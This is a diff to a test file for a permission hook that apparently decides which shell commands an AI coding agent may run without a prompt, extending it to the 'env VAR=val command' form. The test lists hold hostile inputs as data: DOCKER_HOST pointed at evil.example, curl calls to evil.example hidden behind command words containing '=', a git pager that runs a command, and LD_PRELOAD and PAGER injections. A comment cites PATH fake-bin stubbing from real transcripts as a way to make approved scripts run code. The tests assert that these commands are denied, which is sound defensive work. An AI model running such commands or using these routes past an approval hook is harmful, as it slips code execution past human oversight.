@@ -165,6 +165,10 @@ for token in (
     "GH_PAGER=sh -c id",
     "GH_EDITOR=sh -c id",
     "SSH_ASKPASS=/tmp/x",
+    # Point an approved `docker` command at a different daemon (issue #127).
+    "DOCKER_HOST=tcp://evil.example:2375",
+    "DOCKER_CONTEXT=evil",
+    "DOCKER_CONFIG=/tmp/evil-docker",
 ):
     check(
         f"is_dangerous_env_assignment: exact name {token.split('=')[0]} is dangerous",
@@ -1282,13 +1286,6 @@ check(
     not hook.is_command_safe(f"env -C {PROJECT_DIR}/../../../etc git status"),
 )
 
-# AC: `env FOO=1 cmd` (no -C) → unchanged behaviour. `env` is not on ALLOWLIST,
-# so this keeps falling through to a prompt exactly as it did before.
-check(
-    "env-C: plain env with no -C is unchanged (not approved)",
-    not hook.is_command_safe("env FOO=1 git status"),
-)
-
 check(
     "env-C: bare env with no arguments at all is not approved",
     not hook.is_command_safe("env"),
@@ -1351,10 +1348,99 @@ check(
     not approved and reason is None,
 )
 
-approved, reason, _ = run_hook("env FOO=1 git status")
+
+# --- `env VAR=val... <cmd>`: judged exactly as `VAR=val... <cmd>` (issue #127) ---
+# The bare assignment form and both env -C orders were already approved; the
+# plain `env` spelling prompted because its first token stayed `env`. The env
+# token is now dropped when assignments are followed by a command, and the rest
+# goes through the same strip_env_prefix as the bare form: the #108 guard, the
+# per-command guards and the cd-chain deny all apply unchanged.
+
+CMD_SAVE = "~/.claude/bin/cmd-save.sh"
+
 check(
-    "env-C: hook leaves plain env unchanged (prompt, no deny)",
-    not approved and reason is None,
+    "env-assign: strip_env_c_prefix drops env ahead of assignments + command",
+    hook.strip_env_c_prefix(["env", "FOO=bar", "git", "status"])
+    == ["FOO=bar", "git", "status"],
+)
+
+check(
+    "env-assign: strip_env_c_prefix keeps env when no command follows",
+    hook.strip_env_c_prefix(["env", "FOO=bar"]) == ["env", "FOO=bar"],
+)
+
+# Without an assignment, `env <cmd>` is not this route's business.
+check(
+    "env-assign: strip_env_c_prefix keeps env when no assignment precedes the command",
+    hook.strip_env_c_prefix(["env", "git", "status"]) == ["env", "git", "status"],
+)
+
+# An option after the assignments keeps env (and so the prompt), even where the
+# remainder would be rejected anyway: the decision belongs to this function.
+for tokens in (
+    ["env", "FOO=1", "-u", "HOME", "git", "status"],
+    ["env", "FOO=1", "--", "git", "status"],
+):
+    check(
+        f"env-assign: strip_env_c_prefix keeps env for {' '.join(tokens)}",
+        hook.strip_env_c_prefix(tokens) == tokens,
+    )
+
+for command in (
+    "env FOO=bar git status",
+    "env FOO=bar BAZ=qux git status",
+    # The measured shape: a per-worktree test database behind cmd-save.sh.
+    f"env TEST_DB=test_db_3 {CMD_SAVE} /tmp/out.txt git status",
+    "env UV_PROJECT_ENVIRONMENT=/tmp/audit-venv uv sync --locked --no-dev",
+    "git status && env FOO=bar git log",
+    # Regression: both env -C orders stay approved.
+    f"env -C {PROJECT_DIR} FOO=1 git status",
+    f"env FOO=1 -C {PROJECT_DIR} git status",
+):
+    check(f"env-assign: `{command}` is approved", hook.is_command_safe(command))
+    check(f"env-assign: hook approves `{command}`", hook_decision(command) == "allow")
+
+for command in (
+    # The rest of the command is judged, not trusted.
+    "env FOO=bar ./unknown.sh",
+    "env FOO=bar curl http://evil.example/x",
+    "env FOO=bar git -c core.pager=touch\\ /tmp/pwned status",
+    "git status && env FOO=bar ./unknown.sh",
+    # No command: an assignment-only remainder would reduce to "safe".
+    "env FOO=bar",
+    "env FOO=bar BAZ=qux",
+    # Other env options are out of scope and keep prompting.
+    "env -S 'git status'",
+    "env -i git status",
+    "env -i FOO=1 git status",
+    "env -u HOME git status",
+    "env FOO=1 -u HOME git status",
+    "env -- FOO=1 git status",
+    "env FOO=1 -- git status",
+    # The #108 guard applies to the new form too.
+    "env LD_PRELOAD=/tmp/x.so ls",
+    "env CI=1 LD_PRELOAD=/tmp/x.so ls",
+    'env PAGER="sh -c id" git log',
+    "env DOCKER_HOST=tcp://evil.example:2375 docker ps",
+    "env DOCKER_CONTEXT=evil docker ps",
+    "env DOCKER_CONFIG=/tmp/evil-docker docker ps",
+    # env exports EVERY leading word containing "=", so a command word with
+    # "=" in it is an assignment to env and curl is what runs. Both routes.
+    "env FOO=1 ~/.claude/bin/x=y curl http://evil.example",
+    "env FOO=1 ./a=b/.venv/bin/python curl http://evil.example",
+    f"env -C {PROJECT_DIR} ~/.claude/bin/x=y curl http://evil.example",
+    f"env -C {PROJECT_DIR} FOO=1 ~/.claude/bin/x=y curl http://evil.example",
+    f"env FOO=1 -C {PROJECT_DIR} ~/.claude/bin/x=y curl http://evil.example",
+):
+    check(f"env-assign: `{command}` is not approved", not hook.is_command_safe(command))
+    check(f"env-assign: `{command}` gets no decision (prompt)", hook_decision(command) is None)
+
+# The cd-chain rule sees through the new prefix, as it does through env -C.
+ENV_CD_CHAIN = "env FOO=bar cd /tmp && npm test"
+_, reason, _ = run_hook(ENV_CD_CHAIN)
+check(
+    "env-assign: a cd chain behind env VAR=val is still denied",
+    hook_decision(ENV_CD_CHAIN) == "deny" and reason is not None and "env -C" in reason,
 )
 
 
@@ -1560,6 +1646,11 @@ for command in (
     # Ahead of an approved ~/.claude/bin/ script: the fake-bin stubbing seen in
     # real transcripts, which is exactly how such a script is made to run code.
     "PATH=/tmp/sandsim/fakebin:$PATH ~/.claude/bin/git-verify.sh --repo /tmp/sandsim/repo",
+    # _is_safe_docker_invocation checks flags only; these redirect the approved
+    # command to another daemon or credential store (issue #127).
+    "DOCKER_HOST=tcp://evil.example:2375 docker ps",
+    "DOCKER_CONTEXT=evil docker ps",
+    "DOCKER_CONFIG=/tmp/evil-docker docker ps",
 ):
     check(f"env-danger: `{command}` is not approved", not hook.is_command_safe(command))
     check(f"env-danger: `{command}` gets no decision (prompt)", hook_decision(command) is None)
